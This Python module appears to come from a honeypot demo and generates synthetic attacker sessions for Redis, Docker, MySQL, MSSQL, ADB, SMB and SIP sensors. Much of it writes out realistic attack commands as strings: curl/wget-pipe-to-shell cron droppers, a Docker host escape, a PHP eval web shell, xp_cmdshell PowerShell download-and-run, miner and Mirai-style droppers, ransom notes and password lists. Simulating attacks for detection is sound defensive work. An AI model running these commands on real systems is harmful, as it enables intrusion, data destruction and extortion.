"""Attack scripts for the database, container, mobile, file-sharing and VoIP sensors.

Event shapes follow the "Events" tables in ``sensors/<name>/README.md``. As everywhere in the
demo, nothing here talks to a network or executes anything: commands are just strings in events.
Hosts that attackers "use" are synthetic (see ``synthetic_host``) or documentation addresses.
"""

from __future__ import annotations

import hashlib
import random
from typing import Any

from suckerpot_common import EventType, SensorName

from demo.plans import Builder, Plan, _new_plan, _rand_alnum, _wallet, pick, synthetic_host

DOC_PREFIXES = ("192.0.2.", "198.51.100.", "203.0.113.")


def doc_ip(rng: random.Random) -> str:
    return f"{rng.choice(DOC_PREFIXES)}{rng.randint(1, 254)}"


def _flags(*names: str) -> list[str]:
    return list(names)


# ---------------------------------------------------------------- Redis


def _redis_cmd(b: Builder, text: str, flags: list[str], out: str = "+OK", **extra: Any) -> None:
    parts = text.split()
    b.add(
        EventType.command,
        {
            "input": text,
            "command": parts[0].upper() if parts else "",
            "argc": len(parts),
            "flags": flags,
            "output_preview": out,
            "db": 0,
            **extra,
        },
        (0.1, 1.2),
    )


def _redis_download(b: Builder, url: str, tool: str, text: str, via: str = "SET") -> None:
    b.add(
        EventType.download_attempt,
        {"url": url, "tool": tool, "command": text[:512], "via": via},
        (0.01, 0.2),
    )


def _redis_cron(b: Builder, miner: bool) -> None:
    rng = b.rng
    host = synthetic_host(rng)
    _redis_cmd(
        b, "CONFIG SET dir /var/spool/cron", _flags("config_set", "config_set_dir", "cron_write")
    )
    _redis_cmd(
        b, "CONFIG SET dbfilename root", _flags("config_set", "config_set_dbfilename", "cron_write")
    )
    if miner:
        url = f"http://{host}/kinsing"
        body = f"*/2 * * * * wget -q -O- {url} | sh"
        flags = _flags("cron_payload", "download", "miner", "kinsing", "dropper")
    else:
        url = f"http://{host}/s.sh"
        body = f"*/1 * * * * curl -fsSL {url} | sh"
        flags = _flags("cron_payload", "download", "dropper")
    text = f'SET backup1 "\\n\\n{body}\\n\\n"'
    _redis_cmd(b, text, flags)
    _redis_download(b, url, "wget" if miner else "curl", text)
    _redis_cmd(b, "SAVE", _flags("save", "cron_write"))


def _redis_ssh_key(b: Builder) -> None:
    key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ" + _rand_alnum(
        b.rng, 24, "abcdefghijklmnopqrstuvwxyz0123456789"
    )
    _redis_cmd(
        b, "CONFIG SET dir /root/.ssh/", _flags("config_set", "config_set_dir", "ssh_key_write")
    )
    _redis_cmd(
        b,
        "CONFIG SET dbfilename authorized_keys",
        _flags("config_set", "config_set_dbfilename", "ssh_key_write"),
    )
    _redis_cmd(b, f'SET k "\\n\\n{key} root@build\\n\\n"', _flags("ssh_key_payload"))
    _redis_cmd(b, "SAVE", _flags("save", "ssh_key_write"))


def _redis_rogue(b: Builder) -> None:
    rng = b.rng
    master = doc_ip(rng)
    b.add(
        EventType.scan,
        {
            "kind": "redis_replication",
            "master_host": master,
            "master_port": 21000,
            "command": "SLAVEOF",
            "flags": _flags("slaveof"),
        },
        (0.1, 0.6),
    )
    _redis_cmd(b, f"SLAVEOF {master} 21000", _flags("slaveof"), master=f"{master}:21000")
    _redis_cmd(b, "CONFIG SET dbfilename exp.so", _flags("config_set", "config_set_dbfilename"))
    _redis_cmd(b, "MODULE LOAD /tmp/exp.so", _flags("module_load"), module_path="/tmp/exp.so")
    _redis_cmd(
        b, "system.exec id", _flags("unknown_command"), out="-ERR unknown command 'system.exec'"
    )
    _redis_cmd(b, "SLAVEOF NO ONE", _flags("slaveof"))
    _redis_cmd(b, "MODULE UNLOAD system", _flags("module_load"))


def build_redis(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.redis, ip, 6379)
    b = Builder(rng, plan)
    b.connect()
    kind = pick(
        rng,
        [
            ("info", 30),
            ("cron", 16),
            ("sshkey", 9),
            ("rogue", 12),
            ("miner", 9),
            ("ransom", 5),
            ("auth", 14),
            ("cross", 5),
        ],
    )
    reason = "client_closed"
    if kind in ("cron", "sshkey", "rogue", "miner", "ransom") and rng.random() < 0.3:
        b.add(
            EventType.login_attempt,
            {
                "username": "default",
                "password": rng.choice(["foobared", "redis", "123456"]),
                "success": False,
                "method": "redis-auth",
                "flags": _flags("auth"),
            },
            (0.1, 0.5),
        )
    if kind == "info":
        _redis_cmd(b, "INFO", [], out="# Server\\r\\nredis_version:7.0.15")
        for c in rng.sample(["PING", "CONFIG GET dir", "KEYS *", "CLIENT LIST", "DBSIZE"], 2):
            _redis_cmd(b, c, _flags("recon") if c.startswith(("CONFIG", "CLIENT")) else [])
    elif kind == "cron":
        _redis_cron(b, miner=False)
    elif kind == "miner":
        _redis_cron(b, miner=True)
    elif kind == "sshkey":
        _redis_ssh_key(b)
    elif kind == "rogue":
        _redis_rogue(b)
    elif kind == "ransom":
        _redis_cmd(b, "KEYS *", [], out="*3")
        _redis_cmd(b, "FLUSHALL", _flags("flushall"))
        note = f"Your data was backed up. Send 0.05 bitcoin to {_wallet(rng)[:34]} to recover"
        _redis_cmd(b, f'SET RECOVER_YOUR_DATA "{note}"', _flags("ransom_note"))
    elif kind == "auth":
        for _ in range(rng.randint(1, 9)):
            pw = rng.choice(["", "redis", "123456", "password", "foobared", "admin", "root"])
            b.add(
                EventType.login_attempt,
                {
                    "username": "default",
                    "password": pw,
                    "success": False,
                    "method": "redis-auth",
                    "flags": _flags("auth"),
                },
                (0.1, 0.8),
            )
    else:
        b.add(
            EventType.scan,
            {"kind": "cross_protocol", "input": "GET / HTTP/1.1", "protocol_guess": "http"},
            (0.05, 0.4),
        )
        reason = "cross_protocol"
    commands = sum(1 for st in plan.steps if st.type is EventType.command)
    return b.finish(reason, extra={"commands": commands, "bytes_in": 40 * len(plan.steps)})


# ---------------------------------------------------------------- Docker

_DOCKER_MINERS = ["xmrig/xmrig", "kinsing/kinsing", "alpine", "ubuntu", "busybox", "debian"]


def _docker_req(
    b: Builder,
    method: str,
    path: str,
    status: int,
    flags: list[str],
    ua: str,
    host: str,
    **extra: Any,
) -> None:
    b.add(
        EventType.http_request,
        {
            "method": method,
            "path": path,
            "query": "",
            "http_version": "HTTP/1.1",
            "host": host,
            "user_agent": ua,
            "status": status,
            "api_version": "1.43",
            "flags": flags,
            **extra,
        },
        (0.05, 0.6),
    )


def _docker_create(
    b: Builder,
    ua: str,
    host: str,
    image: str,
    cmd: str,
    *,
    privileged: bool,
    binds: list[str],
    miner: bool,
    url: tuple[str, str] | None,
) -> None:
    rng = b.rng
    flags = _flags("container_create", f"image:{image}")
    if privileged:
        flags.append("privileged")
    if binds:
        flags.append("host_mount")
        if any("docker.sock" in x for x in binds):
            flags.append("docker_sock_mount")
    if miner:
        flags.append("miner")
    cid = _rand_alnum(rng, 64, "0123456789abcdef")
    _docker_req(
        b,
        "POST",
        "/containers/create",
        201,
        flags,
        ua,
        host,
        route="containers/create",
        container={"image": image, "cmd": cmd.split(), "privileged": privileged, "binds": binds},
        container_id=cid,
        body_length=len(cmd) + 120,
    )
    b.add(
        EventType.command,
        {"input": cmd, "kind": "container_create", "image": image, "flags": flags},
        (0.01, 0.1),
    )
    if url:
        b.add(
            EventType.download_attempt,
            {"url": url[1], "tool": url[0], "command": cmd[:512], "source": "container.cmd"},
            (0.01, 0.1),
        )
    _docker_req(
        b, "POST", f"/containers/{cid[:12]}/start", 204, _flags("container_start"), ua, host
    )


def build_docker(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.docker, ip, 2375)
    b = Builder(rng, plan)
    b.connect({"transport": "tcp"})
    ua = rng.choice(
        [
            "Go-http-client/1.1",
            "Docker-Client/24.0.7 (linux)",
            "curl/8.4.0",
            "python-requests/2.31.0",
        ]
    )
    host = f"{doc_ip(rng)}:2375"
    kind = pick(
        rng,
        [("recon", 36), ("miner", 22), ("escape", 18), ("sock", 6), ("auth", 6), ("nonhttp", 12)],
    )
    reason = "client_closed"
    if kind in ("recon", "miner", "escape", "sock"):
        _docker_req(b, "GET", "/version", 200, [], ua, host, route="version")
    if kind == "recon":
        for path in rng.sample(["/info", "/containers/json", "/images/json", "/v1.43/info"], 2):
            _docker_req(b, "GET", path, 200, _flags("recon"), ua, host)
    elif kind == "miner":
        image = rng.choice(_DOCKER_MINERS)
        _docker_req(
            b,
            "POST",
            "/images/create",
            200,
            _flags("image_pull", f"image:{image}"),
            ua,
            host,
            query=f"fromImage={image}",
            pull={"image": image, "tag": "latest"},
        )
        h = synthetic_host(rng)
        if rng.random() < 0.5:
            u = f"http://{h}/xmrig.sh"
            cmd = f"sh -c 'wget -qO- {u} | sh; ./xmrig -o stratum+tcp://pool.{h}:3333'"
            dl: tuple[str, str] | None = ("wget", u)
        else:
            cmd = f"./xmrig -o stratum+tcp://pool.{h}:3333 -u {_wallet(rng)[:40]} --donate-level 1"
            dl = None
        _docker_create(b, ua, host, image, cmd, privileged=False, binds=[], miner=True, url=dl)
    elif kind in ("escape", "sock"):
        image = rng.choice(["alpine", "ubuntu", "busybox"])
        h = synthetic_host(rng)
        u = f"http://{h}/c.sh"
        if kind == "escape":
            binds = ["/:/host"]
            cmd = f"chroot /host sh -c 'curl -fsSL {u} | sh; echo ssh-rsa AAAA >> /root/.ssh/authorized_keys'"
        else:
            binds = ["/var/run/docker.sock:/var/run/docker.sock"]
            cmd = f"sh -c 'apk add docker-cli; wget -O- {u} | sh'"
        _docker_create(
            b,
            ua,
            host,
            image,
            cmd,
            privileged=kind == "escape",
            binds=binds,
            miner=False,
            url=("curl" if kind == "escape" else "wget", u),
        )
    elif kind == "auth":
        for _ in range(rng.randint(1, 4)):
            b.add(
                EventType.login_attempt,
                {
                    "username": rng.choice(["admin", "docker", "root"]),
                    "password": rng.choice(["admin", "123456", "docker"]),
                    "success": False,
                    "method": "registry_auth",
                    "server": "registry-1.docker.io",
                },
                (0.1, 0.8),
            )
    else:
        b.add(
            EventType.scan,
            {"kind": "non_http", "payload_preview": rng.randbytes(16).hex(), "text_preview": ""},
            (0.05, 0.4),
        )
        reason = "protocol_error"
    return b.finish(
        reason,
        extra={"requests": sum(1 for st in plan.steps if st.type is EventType.http_request)},
    )


# ---------------------------------------------------------------- MySQL

MYSQL_USERS = [
    "root",
    "root",
    "root",
    "admin",
    "mysql",
    "test",
    "user",
    "wordpress",
    "db",
    "backup",
]
MYSQL_PASSWORDS = [
    "",
    "root",
    "123456",
    "password",
    "admin",
    "mysql",
    "toor",
    "12345678",
    "1234",
    "Passw0rd",
    "qwerty",
    "P@ssw0rd",
    "test",
    "changeme",
    "mysql123",
    "root123",
]


def _mysql_login(b: Builder, user: str, pw: str, ok: bool, attempt: int) -> None:
    b.add(
        EventType.login_attempt,
        {
            "username": user,
            "password": pw,
            "success": ok,
            "method": "mysql_native_password",
            "password_source": "empty" if pw == "" else "scramble_match",
            "attempt": attempt,
            "client_plugin": "mysql_native_password",
            "database": None,
            "tls": False,
        },
        (0.2, 1.0),
    )


def _mysql_q(b: Builder, sql: str, flags: list[str], out: str = "OK") -> None:
    b.add(
        EventType.command,
        {
            "input": sql,
            "protocol_command": "COM_QUERY",
            "database": None,
            "statements": 1,
            "length": len(sql),
            "truncated": False,
            "flags": flags,
            "output_preview": out,
        },
        (0.1, 1.5),
    )


def build_mysql(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.mysql, ip, 3306)
    b = Builder(rng, plan)
    b.connect({"server_version": "8.0.36-0ubuntu0.22.04.1"})
    kind = pick(
        rng,
        [("brute", 52), ("recon", 14), ("exfil", 10), ("udf", 6), ("ransom", 8), ("nonmysql", 10)],
    )
    reason = "access_denied"
    attempts = 0
    if kind == "brute":
        for i in range(1 + min(int(rng.expovariate(1 / 6)), 30)):
            _mysql_login(b, rng.choice(MYSQL_USERS), rng.choice(MYSQL_PASSWORDS), False, i + 1)
            attempts += 1
        reason = "auth_limit" if attempts >= 8 else "access_denied"
    elif kind == "nonmysql":
        b.add(
            EventType.scan,
            {
                "kind": "non_mysql",
                "protocol_guess": "http",
                "payload_preview": b"GET / HTTP/1.0\r\n".hex(),
                "bytes_received": 16,
            },
            (0.05, 0.3),
        )
        reason = "non_mysql"
    else:
        for i in range(rng.randint(0, 3)):
            _mysql_login(b, "root", rng.choice(MYSQL_PASSWORDS), False, i + 1)
            attempts += 1
        _mysql_login(b, "root", rng.choice(["123456", "root", "", "password"]), True, attempts + 1)
        attempts += 1
        _mysql_q(b, "SELECT VERSION()", [], "8.0.36-0ubuntu0.22.04.1")
        if kind == "recon":
            _mysql_q(
                b, "SHOW DATABASES", _flags("show_databases"), "information_schema, mysql, shop"
            )
            _mysql_q(
                b, "SELECT user,host,authentication_string FROM mysql.user", _flags("user_dump")
            )
        elif kind == "exfil":
            _mysql_q(b, "SELECT LOAD_FILE('/etc/passwd')", _flags("load_file"), "NULL")
            _mysql_q(
                b,
                "SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/c.php'",
                _flags("into_outfile"),
                "ERROR 1290 (secure-file-priv)",
            )
        elif kind == "udf":
            h = synthetic_host(rng)
            u = f"http://{h}/lib_mysqludf_sys.so"
            _mysql_q(
                b,
                "CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so'",
                _flags("udf"),
                "ERROR 1126",
            )
            sql = f"SELECT sys_exec('wget {u} -O /tmp/.x; sh /tmp/.x')"
            _mysql_q(b, sql, _flags("udf"), "ERROR 1305")
            b.add(
                EventType.download_attempt,
                {"url": u, "tool": "wget", "command": sql, "protocol": "mysql"},
                (0.01, 0.1),
            )
        else:  # ransom
            _mysql_q(b, "SHOW DATABASES", _flags("show_databases"), "shop, crm")
            _mysql_q(b, "DROP DATABASE shop", _flags("drop_database"))
            _mysql_q(b, "CREATE DATABASE RECOVER_YOUR_DATA", [])
            note = f"All your data is backed up. Send 0.1 BTC to {_wallet(rng)[:34]} to recover."
            _mysql_q(
                b, f"INSERT INTO RECOVER_YOUR_DATA.README VALUES ('{note}')", _flags("ransom_note")
            )
        reason = "client_quit"
    return b.finish(
        reason,
        extra={
            "auth_attempts": attempts,
            "logged_in": kind not in ("brute", "nonmysql"),
            "commands": sum(1 for st in plan.steps if st.type is EventType.command),
        },
    )


# ---------------------------------------------------------------- MSSQL

MSSQL_PASSWORDS = [
    "",
    "sa",
    "password",
    "123456",
    "Password1",
    "P@ssw0rd",
    "admin",
    "sql",
    "Sa123456",
    "sqlserver",
    "1qaz2wsx",
    "Passw0rd",
    "microsoft",
    "master",
    "Welcome1",
]


def _mssql_login(b: Builder, user: str, pw: str, ok: bool) -> None:
    b.add(
        EventType.login_attempt,
        {
            "username": user,
            "password": pw,
            "success": ok,
            "method": "tds-sql",
            "hostname": b.rng.choice(
                ["WIN-" + _rand_alnum(b.rng, 7, "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789"), "localhost"]
            ),
            "app_name": b.rng.choice(
                [
                    "Microsoft SQL Server Management Studio",
                    "go-mssqldb",
                    ".Net SqlClient Data Provider",
                ]
            ),
            "client_library": "ODBC",
            "database": "master",
            "tds_version": "7.4",
            "client_pid": b.rng.randint(300, 9000),
        },
        (0.2, 1.2),
    )


def _mssql_q(b: Builder, sql: str, flags: list[str], out: str = "") -> None:
    b.add(
        EventType.command,
        {
            "input": sql,
            "kind": "sql_batch",
            "flags": flags,
            "output_preview": out,
            "database": "master",
            "login": "sa",
        },
        (0.1, 1.5),
    )


def build_mssql(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.mssql, ip, 1433)
    b = Builder(rng, plan)
    b.connect()
    kind = pick(
        rng, [("brute", 55), ("rce", 22), ("oa", 5), ("ransom", 4), ("recon", 7), ("nontds", 7)]
    )
    reason = "client_closed"
    logins = 0
    if kind == "brute":
        for _ in range(1 + min(int(rng.expovariate(1 / 8)), 40)):
            _mssql_login(
                b,
                rng.choice(["sa", "sa", "sa", "admin", "sqlserver"]),
                rng.choice(MSSQL_PASSWORDS),
                False,
            )
            logins += 1
        reason = "auth_limit" if logins >= 10 else "client_closed"
    elif kind == "nontds":
        b.add(
            EventType.scan,
            {
                "kind": "non_tds",
                "payload_preview": b"\x16\x03\x01\x02\x00".hex(),
                "bytes_received": 5,
            },
            (0.05, 0.3),
        )
    else:
        for _ in range(rng.randint(0, 3)):
            _mssql_login(b, "sa", rng.choice(MSSQL_PASSWORDS), False)
            logins += 1
        _mssql_login(b, "sa", rng.choice(["sa", "Passw0rd", "123456"]), True)
        logins += 1
        _mssql_q(b, "SELECT @@version", [], "Microsoft SQL Server 2019 (RTM-CU18)")
        if kind == "recon":
            _mssql_q(b, "SELECT name FROM sys.databases", [], "master, tempdb, model, msdb")
            _mssql_q(b, "SELECT name, password_hash FROM sys.sql_logins", [], "")
        elif kind == "rce":
            h = synthetic_host(rng)
            u = f"http://{h}/a.exe"
            _mssql_q(
                b,
                "EXEC sp_configure 'show advanced options', 1; RECONFIGURE",
                _flags("sp_configure", "reconfigure"),
            )
            _mssql_q(
                b,
                "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE",
                _flags("sp_configure", "reconfigure"),
            )
            sql = (
                "EXEC xp_cmdshell 'powershell -nop -c \"iwr "
                + u
                + " -OutFile C:\\Windows\\Temp\\a.exe; "
                "Start-Process C:\\Windows\\Temp\\a.exe\"'"
            )
            _mssql_q(b, sql, _flags("xp_cmdshell", "shell_command", "lolbin"), "output\\nNULL")
            b.add(
                EventType.download_attempt,
                {"url": u, "tool": "powershell", "command": sql[:512]},
                (0.01, 0.1),
            )
        elif kind == "oa":
            _mssql_q(
                b,
                "DECLARE @o INT; EXEC sp_OACreate 'WScript.Shell', @o OUT; EXEC sp_OAMethod @o, 'Run', NULL, 'cmd /c whoami'",
                _flags("sp_oacreate", "ole_automation", "shell_command"),
            )
        else:  # ransom
            _mssql_q(b, "DROP DATABASE Sales", _flags("drop_database"))
            note = f"Your DB was encrypted. Pay 0.1 BTC to {_wallet(rng)[:34]}."
            _mssql_q(
                b,
                f"CREATE TABLE README (note nvarchar(200)); INSERT INTO README VALUES ('{note}')",
                _flags("ransom_note"),
            )
        reason = "client_closed"
    return b.finish(
        reason,
        extra={
            "logins": logins,
            "authenticated": kind in ("rce", "oa", "ransom", "recon"),
            "messages": len(plan.steps),
        },
    )


# ---------------------------------------------------------------- ADB

ADB_BANNER = "device::ro.product.name=sailfish;ro.product.model=Pixel;ro.product.device=sailfish;features=cmd,stat_v2,shell_v2"


def _adb_cmd(b: Builder, text: str, flags: list[str], out: str = "", **extra: Any) -> None:
    b.add(
        EventType.command,
        {
            "input": text,
            "output_preview": out[:160],
            "cwd": "/data/local/tmp",
            "user": "shell",
            "prompt": "shell@sailfish:/ $",
            "status": 0,
            "service": "shell",
            "interactive": False,
            "flags": flags,
            **extra,
        },
        (0.1, 1.2),
    )


def _adb_download(b: Builder, tool: str, url: str, text: str) -> None:
    b.add(
        EventType.download_attempt,
        {
            "url": url,
            "tool": tool,
            "command": text[:512],
            "cwd": "/data/local/tmp",
            "user": "shell",
            "flags": _flags("adb_shell"),
        },
        (0.01, 0.2),
    )


def build_adb(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.adb, ip, 5555)
    b = Builder(rng, plan)
    b.connect(
        {
            "banner": ADB_BANNER,
            "client_version": 0x01000001,
            "client_maxdata": 262144,
            "client_banner": "host::features=shell_v2,cmd",
        }
    )
    kind = pick(
        rng,
        [("recon", 34), ("miner", 18), ("mirai", 16), ("push", 9), ("install", 8), ("probe", 15)],
    )
    shell = _flags("adb_shell")
    h = synthetic_host(rng)
    if kind == "recon":
        for c in rng.sample(
            [
                "getprop ro.product.model",
                "getprop ro.build.version.release",
                "uname -a",
                "id",
                "cat /proc/cpuinfo",
                "pm list packages",
                "ls /sdcard",
            ],
            rng.randint(2, 4),
        ):
            _adb_cmd(b, c, shell, "sailfish")
    elif kind == "miner":
        u = f"http://{h}/x.sh"
        text = f"cd /data/local/tmp; curl -s {u} | sh; ./xmrig -o stratum+tcp://pool.{h}:3333 --donate-level 1"
        _adb_cmd(b, "getprop ro.product.model", shell, "sailfish")
        _adb_cmd(b, text, shell)
        _adb_download(b, "curl", u, text)
    elif kind == "mirai":
        binary = rng.choice(["a.arm7", "a.arm", "a.mips", "a.x86"])
        u = f"http://{h}/{binary}"
        text = (
            f"cd /data/local/tmp; busybox wget {u} -O {binary}; chmod 777 {binary}; ./{binary} adb"
        )
        _adb_cmd(b, "busybox ECCHI", shell, "ECCHI: applet not found")
        _adb_cmd(b, text, shell)
        _adb_download(b, "wget", u, text)
    elif kind == "push":
        name = rng.choice(["x.sh", "payload.bin", "lib.so"])
        blob = rng.randbytes(64)
        b.add(
            EventType.command,
            {
                "input": f"adb push /data/local/tmp/{name}",
                "flags": _flags("adb_push"),
                "path": f"/data/local/tmp/{name}",
                "sha256": hashlib.sha256(blob).hexdigest(),
                "size": rng.randint(2000, 900000),
                "mode": "0755",
                "truncated": False,
                "stored": False,
            },
            (0.1, 1.0),
        )
        _adb_cmd(b, f"sh /data/local/tmp/{name}", shell)
    elif kind == "install":
        blob = rng.randbytes(64)
        b.add(
            EventType.command,
            {
                "input": "exec:cmd package install -S 1048576",
                "flags": _flags("adb_install"),
                "sha256": hashlib.sha256(blob).hexdigest(),
                "size": 1048576,
                "expected_size": 1048576,
                "truncated": False,
            },
            (0.1, 1.0),
        )
        _adb_cmd(b, "am start -n com.example.app/.Main", _flags("adb_shell", "adb_install"))
    else:
        if rng.random() < 0.6:
            b.add(
                EventType.scan,
                {"kind": "adb_service", "service": rng.choice(["tcp:22", "tcp:5555", "tcp:80"])},
                (0.05, 0.5),
            )
        else:
            b.add(
                EventType.scan,
                {
                    "kind": "raw_payload",
                    "payload_preview": rng.randbytes(12).hex(),
                    "bytes": 12,
                    "reason": "bad_magic",
                },
                (0.05, 0.5),
            )
    commands = sum(1 for st in plan.steps if st.type is EventType.command)
    return b.finish(
        "client_closed",
        extra={
            "commands": commands,
            "downloads": sum(1 for st in plan.steps if st.type is EventType.download_attempt),
        },
    )


# ---------------------------------------------------------------- SMB

SMB_USERS = ["Administrator", "admin", "guest", "user", "backup", "test", "scanner", "sa"]
SMB_DOMAINS = ["WORKGROUP", "WORKGROUP", "", "DOMAIN", "WIN-" + "SRV01"]
_SMB1_DIALECTS = ["PC NETWORK PROGRAM 1.0", "LANMAN1.0", "NT LM 0.12", "SMB 2.002", "SMB 2.???"]


def _smb_scan(b: Builder, kind: str, payload: bytes, flags: list[str], **extra: Any) -> None:
    b.add(
        EventType.scan,
        {
            "kind": kind,
            "protocol_guess": "smb" if payload[4:8] in (b"\xffSMB", b"\xfeSMB") else "unknown",
            "payload_preview": payload[:64].hex(),
            "payload_ascii": "".join(chr(c) if 32 <= c < 127 else "." for c in payload[:64]),
            "bytes_received": len(payload),
            "flags": flags,
            **extra,
        },
        (0.05, 0.5),
    )


def build_smb(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.smb, ip, 445)
    b = Builder(rng, plan)
    b.connect({"transport": "tcp"})
    kind = pick(
        rng,
        [
            ("negotiate", 34),
            ("ntlm", 22),
            ("smb1", 18),
            ("eternal", 9),
            ("nullsess", 7),
            ("nonsmb", 10),
        ],
    )
    reason = "client_closed"
    dialect = rng.choice(["3.1.1", "3.0.2", "2.1", "2.0.2"])
    extra: dict[str, Any] = {"pdus": 2}
    if kind == "negotiate":
        extra.update(
            dialect=dialect, offered_dialects=["2.0.2", "2.1", "3.0", "3.0.2", "3.1.1"], flags=[]
        )
        b.t += rng.uniform(0.1, 1.5)
    elif kind in ("ntlm", "nullsess"):
        extra.update(dialect=dialect, offered_dialects=["2.0.2", "2.1", "3.1.1"], pdus=5)
        n = 1 if kind == "nullsess" else rng.randint(1, 12)
        for _ in range(n):
            anon = kind == "nullsess"
            user = "" if anon else rng.choice(SMB_USERS)
            b.add(
                EventType.login_attempt,
                {
                    "username": user,
                    "password": None,
                    "success": False,
                    "method": "ntlm",
                    "domain": "" if anon else rng.choice(SMB_DOMAINS),
                    "workstation": "WIN-"
                    + _rand_alnum(rng, 6, "ABCDEFGHJKLMNPQRSTUVWXYZ0123456789"),
                    "ntlm_flags": "0xe2088297",
                    "lm_response_len": 24 if anon else 0,
                    "nt_response_len": 0 if anon else 168,
                    "nt_response_preview": rng.randbytes(8).hex(),
                    "anonymous": anon,
                    "flags": _flags("ntlm", "null_session") if anon else _flags("ntlm"),
                },
                (0.2, 1.2),
            )
        extra["flags"] = ["ntlm"]
    elif kind == "smb1":
        outcome = rng.choice(["reset", "reset", "steer_smb2_wildcard", "smb2_002"])
        payload = b"\x00\x00\x00\x85\xffSMB\x72" + rng.randbytes(20) + b"\x02NT LM 0.12\x00"
        _smb_scan(
            b,
            "smb1_negotiate",
            payload,
            _flags("smbv1"),
            smb1_dialects=_SMB1_DIALECTS[: rng.randint(3, 5)],
            smb1_outcome=outcome,
        )
        reason = "smb1_reset" if outcome == "reset" else "client_closed"
        extra.update(flags=["smbv1"])
    elif kind == "eternal":
        cmd = rng.choice(
            [(0x32, "trans2"), (0x32, "trans2"), (0xA0, "nt_transact"), (0x25, "trans")]
        )
        payload = b"\x00\x00\x04\xd0\xffSMB" + bytes([cmd[0]]) + rng.randbytes(60)
        _smb_scan(
            b,
            "smb1_command",
            payload,
            _flags("smbv1"),
            smb1_command=f"0x{cmd[0]:02x}",
            smb1_command_name=cmd[1],
        )
        reason = "smb1_command"
        extra.update(flags=["smbv1"])
    else:
        _smb_scan(b, "non_smb", rng.choice([b"GET / HTTP/1.1\r\n\r\n", rng.randbytes(16)]), [])
        reason = "non_smb"
    return b.finish(reason, extra=extra)


# ---------------------------------------------------------------- SIP

SIP_AGENTS = [
    "friendly-scanner",
    "friendly-scanner",
    "sipcli/v1.8",
    "sundayddr",
    "Zoiper rv2.10",
    "pplsip",
    "VaxSIPUserAgent/3.1",
]
SIP_PREFIXES = [
    "+44",
    "+49",
    "+33",
    "+34",
    "+39",
    "+234",
    "+880",
    "+90",
    "+972",
    "+8613",
    "+5521",
    "00",
]


def _sip_common(rng: random.Random, agent: str, verified: bool) -> dict[str, Any]:
    return {"user_agent": agent, "transport": "udp", "source_verified": verified}


def build_sip(rng: random.Random, ip: str) -> Plan:
    plan = _new_plan(rng, SensorName.sip, ip, 5060)
    b = Builder(rng, plan)
    verified = rng.random() < 0.7
    b.connect({"transport": "udp", "protocol": "SIP", "source_verified": verified})
    kind = pick(
        rng, [("options", 38), ("register", 30), ("invite", 20), ("malformed", 5), ("probe", 7)]
    )
    agent = rng.choice(SIP_AGENTS) if kind != "probe" else "Asterisk PBX 18.0"
    base = _sip_common(rng, agent, verified)
    methods: dict[str, int] = {}
    flags_seen: set[str] = set()
    target = f"sip:100@{doc_ip(rng)}"
    if kind == "options":
        for ext in rng.sample(range(100, 1000), rng.randint(2, 12)):
            b.add(
                EventType.scan,
                {
                    "kind": "options_scan",
                    "method": "OPTIONS",
                    "input": f"OPTIONS sip:{ext}@{doc_ip(rng)} SIP/2.0",
                    "request_uri": f"sip:{ext}@{doc_ip(rng)}",
                    "to": f"sip:{ext}@x",
                    "from": f"sip:{ext}@x",
                    "response_code": 200,
                    "flags": _flags("options_scan", "scanner_ua")
                    if "scanner" in agent
                    else _flags("options_scan"),
                    **base,
                },
                (0.1, 0.9),
            )
        methods["OPTIONS"] = sum(1 for st in plan.steps if st.type is EventType.scan)
        flags_seen |= {"options_scan"}
    elif kind == "register":
        start = rng.choice([100, 1000, 200, 1])
        for ext in range(start, start + rng.randint(5, 60)):
            b.add(
                EventType.login_attempt,
                {
                    "username": str(ext),
                    "password": None,
                    "success": False,
                    "method": "REGISTER",
                    "realm": "asterisk",
                    "uri": target,
                    "algorithm": "MD5",
                    "response_preview": _rand_alnum(rng, 8, "0123456789abcdef"),
                    "from": f"sip:{ext}@x",
                    "response_code": 401,
                    "flags": _flags("register"),
                    **base,
                },
                (0.1, 0.7),
            )
        methods["REGISTER"] = sum(1 for st in plan.steps if st.type is EventType.login_attempt)
        flags_seen |= {"register"}
    elif kind == "invite":
        for _ in range(rng.randint(1, 6)):
            number = rng.choice(SIP_PREFIXES) + "".join(
                rng.choices("0123456789", k=rng.randint(8, 11))
            )
            b.add(
                EventType.command,
                {
                    "input": f"INVITE sip:{number}@{doc_ip(rng)} SIP/2.0",
                    "to": f"sip:{number}@x",
                    "from": "sip:100@x",
                    "dialled": number,
                    "response_code": rng.choice([100, 403, 407]),
                    "output_preview": "SIP/2.0 407 Proxy Authentication Required",
                    "body_preview": "v=0",
                    "flags": _flags("invite", "toll_fraud"),
                    **base,
                },
                (0.2, 1.2),
            )
        methods["INVITE"] = sum(1 for st in plan.steps if st.type is EventType.command)
        flags_seen |= {"invite", "toll_fraud"}
    elif kind == "malformed":
        b.add(
            EventType.scan,
            {
                "kind": "sip_malformed",
                "reason": "bad_request_line",
                "size": 38,
                "preview": "INVITE\\r\\nVia: SIP/2.0/UDP x",
                "source_verified": verified,
            },
            (0.05, 0.4),
        )
    else:
        b.add(
            EventType.scan,
            {
                "kind": "sip_probe",
                "method": "REGISTER",
                "input": "REGISTER sip:x SIP/2.0",
                "request_uri": "sip:x",
                "response_code": 401,
                "flags": _flags("register"),
                **base,
            },
            (0.05, 0.4),
        )
        flags_seen |= {"register"}
        methods["REGISTER"] = 1
    messages = sum(methods.values()) or 1
    if kind in ("options", "register", "invite"):
        b.add(
            EventType.scan,
            {
                "kind": "sip_summary",
                "messages": messages,
                "aggregated": 0,
                "methods": methods,
                "user_agents": [agent],
                "targets": [target],
                "flags": sorted(flags_seen),
                "window_s": 30,
                "source_verified": verified,
            },
            (0.2, 1.0),
        )
    return b.finish(
        "idle",
        extra={
            "messages": messages,
            "bytes_in": 400 * messages,
            "replies": messages,
            "silent": 0,
            "methods": methods,
